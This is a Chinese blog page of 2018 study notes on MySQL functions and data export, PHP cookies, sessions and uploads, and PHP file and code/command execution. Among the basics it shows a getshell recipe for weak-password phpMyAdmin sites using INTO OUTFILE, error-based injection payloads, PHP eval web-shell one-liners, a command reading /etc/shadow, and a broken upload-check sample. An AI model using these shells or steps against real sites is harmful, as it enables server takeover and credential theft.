<h3 id="GROUP-CONCAT-把查询结果链接一起"><a href="#GROUP-CONCAT-把查询结果链接一起" class="headerlink" title="GROUP_CONCAT  把查询结果链接一起"></a>GROUP_CONCAT  把查询结果链接一起</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  group_concat(DISTINCT field) FROM table_name [WHERE 条件] ；</span><br></pre></td></tr></table></figure>
<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><ul>
<li>数据库信息类</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">version()  		显示数据库版本信息</span><br><span class="line"></span><br><span class="line">connection_id()	显示当前连接数</span><br><span class="line"></span><br><span class="line">user()   		当前用户（current_user()、system_user()、session_user()）</span><br><span class="line"></span><br><span class="line">database()  	查看当前使用的数据库</span><br><span class="line"></span><br><span class="line">schema()  		查看当前使用的数据库</span><br><span class="line"></span><br><span class="line">@@hostname  	获取当前计算机名称</span><br><span class="line"></span><br><span class="line">@@tmpdir 		存放临时文件的路径</span><br><span class="line"></span><br><span class="line">@@datadir		存放数据的路径</span><br><span class="line"></span><br><span class="line">@@version		数据库版本</span><br><span class="line"></span><br><span class="line">@@basedir		数据库所在位置</span><br></pre></td></tr></table></figure>
<ul>
<li>字符串操作类</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mid(string,start,length)  			 用来截取字符串中一部分</span><br><span class="line"></span><br><span class="line">SUBSTRING（str,start,length）			把str从start个字符开始截取length个字符，并输出</span><br><span class="line"></span><br><span class="line">ord()  								 用来显示字符的ASCII码</span><br><span class="line"></span><br><span class="line">concat()  							 拼接字符串</span><br><span class="line"></span><br><span class="line">concat_ws()  						 使用分隔符来拼接字符串</span><br><span class="line">第一个参数是分隔符，支持16进制，不能用单双引号包括</span><br><span class="line">  </span><br><span class="line">group_concat()  					 和concat类似，拼接并分组显示数据</span><br><span class="line"></span><br><span class="line">INSERT(str1,start,length,str2)		 把str1的第start个字符往后的length个字符替换为str2	</span><br><span class="line"></span><br><span class="line">LEFT(str,length)					 把str从左边开始截取length个字符并输出</span><br><span class="line"></span><br><span class="line">RIGHT(str,length)					 把str从右边开始截取length个字符并输出</span><br></pre></td></tr></table></figure>
<ul>
<li>其他</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLEEP(5)			让服务器等待5秒后返回0</span><br></pre></td></tr></table></figure>
<ul>
<li>报错函数</li>
</ul>
<p><strong>extractvalue</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(XML_document，XPath_string):</span><br><span class="line">	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">	第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">	作用：从目标XML中返回包含所查询值的字符串</span><br><span class="line">	select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>
<p><strong>UPDATEXML</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">	第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">	作用：改变文档中符合条件的节点的值</span><br><span class="line">	select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
<h1 id="导入导出数据"><a href="#导入导出数据" class="headerlink" title="导入导出数据"></a>导入导出数据</h1><h2 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.mysql命令导入			mysql -uroot -proot &lt; 文件路径</span><br><span class="line"></span><br><span class="line">2.source命令导入</span><br><span class="line"></span><br><span class="line">3.使用 LOAD DATA 导入数据</span><br></pre></td></tr></table></figure>
<h2 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h2><ul>
<li>第一种方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表名 INTO OUTFILE &quot;路径+文件名&quot;;</span><br></pre></td></tr></table></figure>
<p>如果出错，以下为解决办法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv opti</span><br><span class="line">on so it cannot execute this statement</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">执行命令（查看相关配置）：</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;</span><br><span class="line"></span><br><span class="line">secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。</span><br><span class="line"></span><br><span class="line">secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。</span><br><span class="line"></span><br><span class="line">secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</span><br><span class="line"></span><br><span class="line">永久解决办法：</span><br><span class="line">	修改配置文件my.ini，添加如下语句：</span><br><span class="line">	secure_file_priv=			//表示可导入导出到任意目录</span><br><span class="line">	</span><br><span class="line">临时解决办法：</span><br><span class="line">	set global secure_file_priv=&apos;&apos;;</span><br></pre></td></tr></table></figure>
<ul>
<li>第二种方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db_name &gt; ./db_name.sql	在DOS命令下运行</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名</span><br></pre></td></tr></table></figure>
<h2 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 首先通过google hacking找到phpmyadmin的网站</span><br><span class="line"></span><br><span class="line">2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件</span><br><span class="line"></span><br><span class="line">3. 执行SQL语句，查看数据库所在位置：select @@basedir;</span><br><span class="line"></span><br><span class="line">4. 猜测根目录写入木马文件：`select  &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html`</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/22/mysql数据库基础知识笔记/" data-id="cjq4hvb490008oonppoybub7e" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP文件包含、cookie、文件上传" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/20/PHP文件包含、cookie、文件上传/" class="article-date">
  <time datetime="2018-12-20T07:34:40.000Z" itemprop="datePublished">2018-12-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/20/PHP文件包含、cookie、文件上传/">PHP文件包含、cookie、文件上传</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PHP文件包含、cookie、文件上传"><a href="#PHP文件包含、cookie、文件上传" class="headerlink" title="PHP文件包含、cookie、文件上传"></a>PHP文件包含、cookie、文件上传</h1><h2 id="一、文件包含"><a href="#一、文件包含" class="headerlink" title="一、文件包含"></a>一、文件包含</h2><p>在 PHP 中，可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。</p>
<p><strong>include</strong> 和 <strong>require</strong> 语句用于在执行流中插入写在其他文件中的有用的代码。</p>
<p>两者之间的区别在于：</p>
<p><strong>include</strong>生成一个警告，在错误发生后依然会执行。</p>
<p><strong>require</strong>生成一个致命错误，在错误发生时就会停止执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include &apos;head.php&apos;;  include会在PHP文件开始运行的时候包含</span><br><span class="line"></span><br><span class="line">require &apos;tail.php&apos;;  require会在PHP文件运行到require关键字时包含</span><br></pre></td></tr></table></figure>
<p>include_once和require_once表示只包含一次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include_once &apos;head.php&apos;;</span><br><span class="line"></span><br><span class="line">require_once &apos;tail.php&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="二、cookie和session"><a href="#二、cookie和session" class="headerlink" title="二、cookie和session"></a>二、cookie和session</h2><h3 id="2-1cookie"><a href="#2-1cookie" class="headerlink" title="2.1cookie"></a>2.1cookie</h3><p><strong>cookie</strong> 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。</p>
<p><strong>setcookie()</strong>函数用来设置cookie </p>
<p>注意：setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前。</p>
<p>创建一个名为 “user” 的 cookie，并为它赋值 “runoob”。并规定了此 cookie 在一小时后过期： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-1-1取回cookie值"><a href="#2-1-1取回cookie值" class="headerlink" title="2.1.1取回cookie值"></a>2.1.1取回cookie值</h3><p><strong>$_COOKIE</strong> 变量用于取回 cookie 的值。</p>
<p> 取回名为 “user” 的 cookie 的值，并把它显示在了页面上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出 cookie 值</span><br><span class="line">echo $_COOKIE[&quot;user&quot;];</span><br><span class="line"></span><br><span class="line">// 查看所有 cookie</span><br><span class="line">print_r($_COOKIE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-1-2删除cookie"><a href="#2-1-2删除cookie" class="headerlink" title="2.1.2删除cookie"></a>2.1.2删除cookie</h3><p>删除cookie很简单，只要将日期改为过去的时间点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 设置 cookie 过期时间为过去 1 小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-2session"><a href="#2-2session" class="headerlink" title="2.2session"></a>2.2session</h3><p><strong>Session</strong> 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
<p> 在把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
<p>注意：session_start() 函数必须位于<code>&lt;html&gt;</code> 标签之前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-1存储session"><a href="#2-2-1存储session" class="headerlink" title="2.2.1存储session"></a>2.2.1存储session</h3><p>存储和取回 session 变量的方法是使用 PHP $_SESSION 变量： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&apos;views&apos;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;检索&quot;. $_SESSION[&apos;views&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-2删除session"><a href="#2-2-2删除session" class="headerlink" title="2.2.2删除session"></a>2.2.2删除session</h3><p>删除session数据，可以使用 session_destroy() 函数。</p>
<p>session_destroy() 函数是彻底销毁 session </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="三、文件上传"><a href="#三、文件上传" class="headerlink" title="三、文件上传"></a>三、文件上传</h2><p>PHP可以把文件上传到服务器中。</p>
<p>文件上传的HTML表单，代码会在查看页面时出现上传界面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;from&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/from&gt;</span><br></pre></td></tr></table></figure>
<p>在PHP中可以写上传文件的代码</p>
<p>在这里限制了只能上传jpg和png格式的文件如果上传的文件与规定上传的文件格式不匹配，是不允许上传的。</p>
<p>在上传后，文件将会存储在用户指定的文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ext_arr = array(&apos;jpg&apos;, &apos;png&apos;);</span><br><span class="line"> if (isset($_FILES[&apos;file&apos;]))&#123;</span><br><span class="line">     if ($_FILES[&apos;file&apos;] [&apos;error&apos;] == 0 )&#123;</span><br><span class="line">         if (in_array($filename, $ext_arr) === false) &#123;</span><br><span class="line">             echo &quot;上传文件扩展名是不允许的扩展名。&quot;;</span><br><span class="line">         &#125;else &#123;</span><br><span class="line"></span><br><span class="line">             $ok = move_uploaded_file($_FILES[&apos;file&apos;] [&apos;tmp_name&apos;], &apos;./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;name&apos;]);</span><br><span class="line">             if ($ok) &#123;</span><br><span class="line">                 echo &apos;文件保存在: ./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;tmp_name&apos;];</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 echo &apos;文件上传失败&apos;;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在文件夹中的存储方式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/20/PHP文件包含、cookie、文件上传/" data-id="cjq4hvb3j0004oonp16c64adg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-php表单+文件+代码、命令执行" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/20/php表单+文件+代码、命令执行/" class="article-date">
  <time datetime="2018-12-20T07:34:31.000Z" itemprop="datePublished">2018-12-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/20/php表单+文件+代码、命令执行/">php表单+文件+代码、命令执行</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h1><ul>
<li><p>三种接收表单数据的方式<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code></p>
<ul>
<li>特性：<ul>
<li>超全局变量</li>
<li>都是数组</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.	$_GET</span><br><span class="line">	此方式接收表单的method=&apos;get&apos;方式传递的值</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.	$_POST</span><br><span class="line">	此方式接收表单的method=&apos;post&apos;方式传递的值</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.	$_REQUEST</span><br><span class="line">	此方式接收表单get/post方式传递的值</span><br></pre></td></tr></table></figure>
</li>
<li><p>超全局变量$_SERVER：用于收集客户端请求信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_ADDR&apos;]		返回当前运行脚本所在的服务器的IP地址</span><br><span class="line">$_SERVER[&apos;REMOTE_ADDR&apos;]		返回浏览当前页面的用户的IP地址</span><br><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]		服务器主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_HOST&apos;]		用户的主机名</span><br><span class="line">$_SERVER[&apos;REMOTE_PORT&apos;]		用户连接到服务器的端口号</span><br><span class="line">$_SERVER[&apos;HTTP_HOST&apos;]		返回来自当前请求的Host头</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]	来源IP地址（从哪个IP地址跳转过来的）</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><ul>
<li><p><code>fopen()</code>：打开文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(文件名,打开文件的方式);</span><br></pre></td></tr></table></figure>
<ul>
<li>打开文件常用的方式：<ul>
<li><code>r</code>：只读方式打开，指针位置在文件开头</li>
<li><code>r+</code>：读写方式打开，指针位置在文件开头</li>
<li><code>w</code>：写入方式打开，清空文件内容，如果文件不存在则创建</li>
<li><code>w+</code>：读写方式打开，清空文件内容，如果文件不存在则创建</li>
<li><code>a</code>：追加，打开并向文件末尾进行写操作，如果文件不存在则创建</li>
<li><code>a+</code>：可读并追加。通过向文件末尾写内容，来保持文件内容</li>
<li><code>x</code>：只写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li>
<li><code>x+</code>：读写，创建新文件。如果文件已存在，则返回FALSE和一个错误</li>
</ul>
</li>
</ul>
</li>
<li><p><code>fgets()</code>：逐行读取文件，每次只读取一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(文件名);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>fread()</code>：按长度读取文件的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(文件名，长度);			换行也算一个长度</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>fwrite()</code>：写入文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(文件名，内容);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>fputs</code>：<code>fwrite()</code>的别名</p>
</li>
<li><p><code>fclose()</code>：关闭一个打开的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fclose(文件名);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>feof()</code>：检测指针是否已到达文件末尾</p>
<ul>
<li>可以结合while循环来读取文件中所有的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);</span><br><span class="line">while(!feof($file))			//如果达到末尾，会返回TRUE</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>unlink()</code>：删除文件</p>
</li>
<li><p><code>opendir()</code>：打开文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = opendir(目录);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>readdir()</code>：读取文件夹（从目录句柄中读取条目）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readdir($file);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>closedir()</code>：关闭文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">closedir($file);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>file_exists()</code>：检查文件或目录是否存在</p>
</li>
<li><p><code>copy()</code>：复制文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(源文件名,复制后的文件名);		可以移动的同时重命名文件</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>rename()</code>：重命名文件或目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(源文件名,新文件名);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>file_get_contents()</code>：把整个文件读入一个字符串中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(文件[,include_path,context,start,max_length])</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>file_put_contents</code>：把一个字符串写入文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(string $filename,$data)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>用文件操作写一句话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul>
<li><p><code>eval()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数里可以使用单引号或者双引号</span><br><span class="line">使用单引号：变量不转义</span><br><span class="line">使用双引号：变量被转义</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>assert()</code></p>
</li>
<li><p><code>preg_replace()</code>：正则里面使用<code>/e</code>模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>create_function()</code>：创建函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func();</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code>：动态创建函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要求：PHP版本5.2以下才可以使用</span><br><span class="line">在地址栏中使用：a=assert&amp;b=phpinfo()	即可打印PHPinfo</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
<li><p>exec()：使用它必须在第二个参数指定一个变量来接收执行的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;cat /etc/shadow&quot;,$output);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>system()：命令会直接执行，无需变量接收</p>
